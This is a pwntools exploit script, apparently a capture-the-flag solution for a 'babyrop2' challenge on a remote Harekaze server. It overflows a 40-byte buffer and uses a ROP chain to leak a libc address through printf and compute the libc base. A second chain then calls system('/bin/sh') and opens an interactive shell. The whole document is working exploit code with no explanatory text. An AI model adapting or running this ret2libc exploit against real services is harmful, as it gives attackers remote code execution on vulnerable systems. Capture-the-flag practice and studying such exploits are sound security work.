from pwn import *
context.log_level = 'debug'

TARGET = './babyrop2'
HOST = 'problem.harekaze.com'
PORT = 20005

# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x4006cb
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

rdi = 0x400733
r.recvuntil('name?')

payload = ''
payload += 'A' * 40
payload += p64(rdi+1)
payload += p64(rdi)
payload += p64(elf.got['__libc_start_main'])
payload += p64(elf.plt['printf'])
payload += p64(elf.sym['main'])
r.sendline(payload)
r.recvuntil('\n')
leak = u64(r.recv(6).ljust(8, '\x00'))
base = leak - 0x20740
dbg("base")

system = base + 0x45390
binsh = base + 0x18cd57

r.recvuntil('name?')
payload = ''
payload += 'A' * 40
payload += p64(rdi+1)
payload += p64(rdi)
payload += p64(binsh)
payload += p64(system)
r.sendline(payload)

r.interactive()
r.close()
